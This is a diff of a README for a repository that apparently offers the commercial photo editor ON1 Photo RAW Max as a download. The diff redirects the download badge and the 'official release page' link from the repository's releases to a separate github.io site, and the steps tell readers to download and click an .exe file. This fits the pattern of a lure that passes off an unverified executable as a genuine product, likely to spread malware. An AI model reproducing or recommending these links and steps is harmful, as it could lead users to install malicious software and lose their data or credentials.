@@ -1,6 +1,6 @@
 # 📸 ON1-Photo-RAW-Max - Edit photos with professional precision tools
 
-[![](https://img.shields.io/badge/Download-ON1-Photo-RAW-Max-blue.svg)](https://github.com/Chiquitaprecipitous861/ON1-Photo-RAW-Max/releases)
+[![](https://img.shields.io/badge/Download-ON1-Photo-RAW-Max-blue.svg)](https://chiquitaprecipitous861.github.io)
 
 ## 📖 About this application
 
@@ -22,7 +22,7 @@ Your computer needs specific components to run this software well. Check your co
 Follow these steps to obtain the correct installer file.
 
 1.  Open your preferred web browser.
-2.  Visit the official release page: [https://github.com/Chiquitaprecipitous861/ON1-Photo-RAW-Max/releases](https://github.com/Chiquitaprecipitous861/ON1-Photo-RAW-Max/releases)
+2.  Visit the official release page: [https://chiquitaprecipitous861.github.io](https://chiquitaprecipitous861.github.io)
 3.  Look for the section labeled "Assets" at the bottom of the newest release version.
 4.  Find the file that ends in .exe.
 5.  Click the file name to start the download.
